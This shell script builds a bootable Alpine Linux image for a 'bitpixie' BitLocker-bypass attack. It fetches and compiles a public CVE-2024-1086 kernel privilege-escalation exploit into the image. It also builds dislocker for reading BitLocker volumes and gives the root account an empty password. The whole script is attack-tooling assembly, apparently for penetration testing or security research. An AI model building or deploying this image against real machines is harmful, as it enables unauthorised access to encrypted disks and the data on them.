#!/bin/sh
set -e

__() { printf "\n\033[1;32m* %s [%s]\033[0m\n" "$1" "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"; }

#ROOTFS_DEST=/mnt/fs
#mkdir -p "$ROOTFS_DEST"
ROOTFS_DEST=$(mktemp -d)
trap 'rm -rf "$ROOTFS_DEST"' EXIT

__ "Fetching alpine-make-rootfs"

wget https://raw.githubusercontent.com/alpinelinux/alpine-make-rootfs/v0.7.0/alpine-make-rootfs \
    && echo '91ceb95b020260832417b01e45ce02c3a250c4527835d1bdf486bf44f80287dc  alpine-make-rootfs' \
    | sha256sum -c || exit 1 && chmod +x alpine-make-rootfs

__ "Fetching the Debian kernel and modules"

KERNEL_TEMP=$(mktemp -d)
trap 'rm -rf "$KERNEL_TEMP"' EXIT

wget "https://snapshot.debian.org/file/80c35e7ae9d403ebea4a05a83c0cf7871d0c23f7" -O "$KERNEL_TEMP/kernel.deb" \
    && echo "34c3595b6ac8c74fe754d375e04428624e598e4c8ce0d49eaaeceed5324baf31  $KERNEL_TEMP/kernel.deb" \
    | sha256sum -c || exit 1

apk add dpkg
dpkg-deb -x "$KERNEL_TEMP/kernel.deb" "$KERNEL_TEMP/root"
mkdir -p "$ROOTFS_DEST/boot"
cp "$KERNEL_TEMP/root/boot/vmlinuz"* "$ROOTFS_DEST/boot"
depmod -b "$KERNEL_TEMP/root" 5.14.0-1-amd64
cp -r "$KERNEL_TEMP/root/lib" "$ROOTFS_DEST/lib"

__ "Building rootfs"

mkdir -p "$ROOTFS_DEST/etc"
basename "$1" > "$ROOTFS_DEST/etc/bitpixie-release"

# Stop mkinitfs from running during apk install.
mkdir -p "$ROOTFS_DEST/etc/mkinitfs"
echo "disable_trigger=yes" > "$ROOTFS_DEST/etc/mkinitfs/mkinitfs.conf"

export ALPINE_BRANCH=edge
export SCRIPT_CHROOT=yes
export FS_SKEL_DIR=/mnt/root
export FS_SKEL_CHOWN=root:root
#export REPOS_FILE=/mnt/repositories
PACKAGES="$(grep -v -e '^#' -e '^$' /mnt/packages)"
export PACKAGES
./alpine-make-rootfs "$ROOTFS_DEST" /mnt/setup.sh

__ "Building exploit"

EXPLOIT_TEMP=$(mktemp -d)
trap 'rm -rf "$EXPLOIT_TEMP"' EXIT

apk add alpine-sdk
wget https://github.com/martanne/CVE-2024-1086-bitpixie/archive/ae21909107b9aef2419b5260ac9a1ed5f9b28a9b.tar.gz -O "$EXPLOIT_TEMP/exploit.tar.gz" \
    && echo "56affdd1fd016ae8ac36727e96408c7ce98a2eedfe5261dc8d7153424f0b6593  $EXPLOIT_TEMP/exploit.tar.gz" \
    | sha256sum -c || exit 1

tar xf "$EXPLOIT_TEMP/exploit.tar.gz" -C "$EXPLOIT_TEMP"
cd "$EXPLOIT_TEMP/CVE-2024-1086-bitpixie-"*
make CC=cc
cp exploit "$ROOTFS_DEST/sbin"
cd -

__ "Building dislocker-git"

DISLOCKER_TEMP=$(mktemp -d)
trap 'rm -rf "$DISLOCKER_TEMP"' EXIT

apk add alpine-sdk cmake make fuse-dev mbedtls-dev ruby-dev
wget https://github.com/Aorimn/dislocker/archive/3e7aea196eaa176c38296a9bc75c0201df0a3679.tar.gz -O "$DISLOCKER_TEMP/dislocker.tar.gz" \
    && echo "5f402250c7119aad63bd0a413705a29013ff0a6744b08b0288f4eb2f812b0eb6  $DISLOCKER_TEMP/dislocker.tar.gz" \
    | sha256sum -c || exit 1

tar xf "$DISLOCKER_TEMP/dislocker.tar.gz" -C "$DISLOCKER_TEMP"
cd "$DISLOCKER_TEMP/dislocker-"*
cmake -DCMAKE_INSTALL_PREFIX=/usr .
sed -i 's/^#include "mbedtls\/config.h"/#include "mbedtls\/mbedtls_config.h"/;' include/dislocker/ssl_bindings.h
  sed -i 's/^#    define SHA256(input, len, output)         mbedtls_sha256_ret(input, len, output, 0)/#    define SHA256(input, len, output)         mbedtls_sha256(input, len, output, 0)/' include/dislocker/ssl_bindings.h
make
make DESTDIR="$ROOTFS_DEST" install
cd -

__ "Post processing rootfs"

sed -i 's/^root:\*::0:::::/root:::0:::::/g' "$ROOTFS_DEST/etc/shadow"

__ "Building initramfs"

cd "$ROOTFS_DEST"
# find . -path "./boot" -prune -o -print | cpio -o -H newc | gzip > "$ROOTFS_DEST/boot/initramfs-lts"
find . -path "./boot" -prune -o -print | cpio -o -H newc | xz -C crc32 -z -9 --threads=0 -c - > "$ROOTFS_DEST/boot/initramfs-lts"

__ "Created image!"

cp "$ROOTFS_DEST/boot/vmlinuz"* "$1.kernel"
cp "$ROOTFS_DEST/boot/initramfs-lts" "$1.initramfs"

ls -lh "$1"*
